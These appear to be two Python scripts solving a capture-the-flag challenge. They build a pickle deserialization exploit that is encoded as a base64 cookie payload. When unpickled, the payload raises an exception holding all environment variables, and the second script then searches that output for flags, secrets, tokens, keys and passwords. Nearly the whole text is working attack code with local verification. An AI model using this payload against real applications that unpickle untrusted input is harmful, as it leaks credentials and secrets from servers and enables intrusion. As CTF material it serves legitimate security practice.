import pickle
import base64
import os

# Create a class that will execute code during deserialization
# The __reduce__ method returns a tuple that pickle uses to reconstruct the object:
# (callable, args) - pickle will call callable(*args) during deserialization

class Exploit:
    def __reduce__(self):
        # Return a tuple of (callable, args)
        # When pickle unpickles this, it will call exec(deserialize_payload)
        # We need to raise an exception with environment variables in the message
        
        # Option 1: Use __builtins__.__import__('os').environ directly in the exception
        # Option 2: Create a lambda that raises an exception with env data
        
        # Best approach: Use os.environ in a function that raises
        return (self.trigger, ())
    
    @staticmethod
    def trigger():
        # Get all environment variables as a formatted string
        env_vars = dict(os.environ)
        env_str = '\n'.join(f'{k}={v}' for k, v in env_vars.items())
        # Raise an exception with the environment data in the message
        raise Exception(f'Environment variables:\n{env_str}')

# Alternative: More direct approach using lambda
# But lambda can't contain statements like raise, so we use a named function

# Create the exploit object
exploit = Exploit()

# Serialize with protocol 4 (matching the original cookie format)
serialized = pickle.dumps(exploit, protocol=4)

# Base64 encode
payload_b64 = base64.b64encode(serialized).decode()

print(f"Base64 payload: {payload_b64}")
print(f"Payload length: {len(payload_b64)}")
print(f"\nSerialized bytes (hex): {serialized.hex()}")
print(f"\nSerialized bytes length: {len(serialized)}")

print("\n" + "="*60)
print("LOCAL TEST - Deserializing the payload:")
print("="*60)

# Test locally - this should raise an exception with environment data
try:
    decoded = base64.b64decode(payload_b64)
    result = pickle.loads(decoded)
    print(f"Unexpected: Deserialization succeeded, result: {result}")
except Exception as e:
    print(f"SUCCESS! Exception raised during deserialization:")
    print(f"Exception type: {type(e).__name__}")
    print(f"Exception message:\n{e}")
    
    # Check if env data is in the exception
    if 'Environment variables' in str(e) or any(k in str(e) for k in os.environ.keys()):
        print("\n[+] CONFIRMED: Environment variables are in the exception message!")
    else:
        print("\n[!] Warning: Environment variables might not be fully captured")

import pickle
import base64
import os

# The working payload from before
payload_b64 = "gASVIwAAAAAAAACMCF9fbWFpbl9flIwPRXhwbG9pdC50cmlnZ2VylJOUKVKULg=="

print(f"Base64 payload: {payload_b64}")
print(f"Payload length: {len(payload_b64)}")

print("\n" + "="*60)
print("VERIFICATION TEST - Deserializing the payload again:")
print("="*60)

# Test again to confirm consistency
try:
    decoded = base64.b64decode(payload_b64)
    result = pickle.loads(decoded)
    print(f"Unexpected: Deserialization succeeded")
except Exception as e:
    print(f"SUCCESS! Exception raised:")
    print(f"Exception type: {type(e).__name__}")
    print(f"\nFull exception message:\n{'='*60}")
    print(e)
    print('='*60)
    
    # Show specific environment variables that might contain flags
    print("\nKey environment variables found:")
    for key in ['FLAG', 'SECRET', 'TOKEN', 'KEY', 'PASSWORD', 'ADMIN', 'ENV']:
        if key in str(e).upper():
            # Find the actual key-value in the exception
            import re
            matches = re.findall(rf'{key}[^\n=]*=[^\n]+', str(e), re.IGNORECASE)
            for m in matches:
                print(f"  {m}")

